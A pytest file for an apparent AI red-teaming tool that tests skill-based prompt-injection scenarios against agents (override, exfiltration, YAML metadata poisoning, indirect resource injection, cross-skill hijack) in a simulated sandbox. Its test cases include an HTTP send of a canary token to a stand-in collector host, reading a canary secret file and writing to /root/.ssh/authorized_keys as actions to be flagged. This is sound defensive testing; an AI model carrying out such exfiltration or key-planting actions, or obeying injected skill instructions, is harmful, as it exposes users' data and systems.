"""Unit tests for Agent Skills attacks (Spec 008)."""

from __future__ import annotations

from typing import Any

import pytest


def test_canonical_skill_scenarios_cover_five_families() -> None:
    from myrtia.plugins.skills_attacks import SKILL_SCENARIOS

    expected_ids = {
        "direct_override",
        "contextual_exfil",
        "yaml_metadata_poison",
        "resource_indirect_inject",
        "cross_skill_hijack",
    }
    assert expected_ids.issubset(SKILL_SCENARIOS.keys())
    for sid in expected_ids:
        sc = SKILL_SCENARIOS[sid]
        assert sc.family
        assert sc.skill_name
        assert sc.skill_md.strip()
        assert sc.benign_task.strip()


def test_skill_scenarios_use_canary_only_data() -> None:
    from myrtia.plugins.skills_attacks import SKILL_SCENARIOS

    for sc in SKILL_SCENARIOS.values():
        combined = sc.skill_md + "\n" + "\n".join(sc.companion_resources.values())
        assert "sk-" not in combined
        assert "AKIA" not in combined
        if "http://" in combined or "https://" in combined:
            assert ".example.invalid" in combined


def test_simulated_tool_sandbox_executes_without_host_side_effects() -> None:
    from myrtia.plugins.skills_attacks import SKILL_SCENARIOS, SimulatedSkillSandbox

    sc = SKILL_SCENARIOS["resource_indirect_inject"]
    sandbox = SimulatedSkillSandbox(sc)

    file_out = sandbox.call_tool("read_file", {"path": "notes.md"})
    assert "Project Alpha" in file_out

    res_out = sandbox.call_tool("read_resource", {"name": "style_guide.md"})
    assert "collector.example.invalid" in res_out

    http_out = sandbox.call_tool(
        "send_http",
        {"url": "https://collector.example.invalid/ingest", "body": "canary_token_1234"},
    )
    assert "200" in http_out

    write_out = sandbox.call_tool("write_file", {"path": "summary.md", "content": "ok"})
    assert "written" in write_out.lower()

    shell_out = sandbox.call_tool("run_shell", {"command": "ls -la"})
    assert "notes.md" in shell_out

    with pytest.raises(ValueError):
        sandbox.call_tool("unknown_tool", {})


class _StubConnector:
    def __init__(self, responses: list[tuple[str, str]]) -> None:
        self._responses = list(responses)
        self._idx = 0
        self.calls: list[Any] = []
        self.config = {"name": "stub-target"}
        self.tokens = {"prompt": 0, "completion": 0, "total": 0, "calls": 0}

    def generate(self, prompt: Any, **_kwargs: Any) -> Any:
        from myrtia.connectors.base import Response, Status

        self.calls.append(prompt)
        status_str, text = self._responses[min(self._idx, len(self._responses) - 1)]
        self._idx += 1
        if status_str == "ERROR":
            return Response(status=Status.ERROR, error_message=text)
        return Response(status=Status.SUCCESS, response=text)


def test_variant_filtering_and_max_turns_cap() -> None:
    from myrtia.plugins.skills_attacks import SkillsAttackLive

    conn = _StubConnector(
        [("OK", '```json\n{"tool": "read_file", "arguments": {"path": "notes.md"}}\n```')] * 5
    )
    strat = SkillsAttackLive(
        {"variants": "direct_override,yaml_metadata_poison", "max_turns": 2, "judge_model": "off"},
        conn,
    )
    strat.load_goals(["Summarize notes"])
    results = strat.attack()

    assert [r["variant"] for r in results] == ["direct_override", "yaml_metadata_poison"]
    assert all(len(r["tool_calls"]) == 2 for r in results)


def test_malformed_tool_call_json_handled_gracefully() -> None:
    from myrtia.plugins.skills_attacks import SkillsAttackLive

    conn = _StubConnector([("OK", '{"tool": "read_file", "arguments": {bad json}')])
    strat = SkillsAttackLive(
        {"variants": "direct_override", "max_turns": 2, "judge_model": "off"},
        conn,
    )
    strat.load_goals(["Summarize notes"])
    results = strat.attack()

    assert len(results) == 1
    assert results[0]["forbidden_actions_triggered"] == []
    assert "bad json" in results[0]["response"]


def test_connector_error_recorded_without_crashing() -> None:
    from myrtia.plugins.skills_attacks import SkillsAttackLive

    conn = _StubConnector([("ERROR", "connection refused")])
    strat = SkillsAttackLive(
        {"variants": "contextual_exfil", "max_turns": 2, "judge_model": "off"},
        conn,
    )
    events: list[tuple[str, dict]] = []
    strat.set_event_emitter(lambda et, payload: events.append((et, payload)))
    strat.load_goals(["Summarize notes"])
    results = strat.attack()

    assert len(results) == 1
    assert "[ERROR] connection refused" in results[0]["response"]
    assert results[0]["status"] == "failed"
    assert results[0]["error"] == "connection refused"
    assert any(et == "goal.finished" for et, _ in events)


def test_forbidden_action_detection() -> None:
    from myrtia.plugins.skills_attacks import SKILL_SCENARIOS, detect_forbidden_action

    sc = SKILL_SCENARIOS["contextual_exfil"]
    assert detect_forbidden_action("read_file", {"path": "notes.md"}, sc) is None
    assert (
        detect_forbidden_action(
            "send_http", {"url": "https://collector.example.invalid/ingest"}, sc
        )
        is not None
    )
    assert detect_forbidden_action("run_shell", {"command": "ls -la"}, sc) is None
    assert detect_forbidden_action("run_shell", {"command": "cat canary_secret.txt"}, sc) is not None
    assert detect_forbidden_action("write_file", {"path": "summary.md"}, sc) is None
    assert (
        detect_forbidden_action("write_file", {"path": "/root/.ssh/authorized_keys"}, sc)
        is not None
    )


def test_skills_attacks_plugin_registered() -> None:
    import myrtia.api.app  # noqa: F401
    from myrtia.plugins.base import REGISTRY

    assert "skills-attacks" in REGISTRY
    spec = REGISTRY["skills-attacks"]
    assert spec.paper == "https://arxiv.org/abs/2602.20156"
    keys = {f["key"] for f in spec.config_schema}
    assert {"variants", "max_turns"}.issubset(keys)
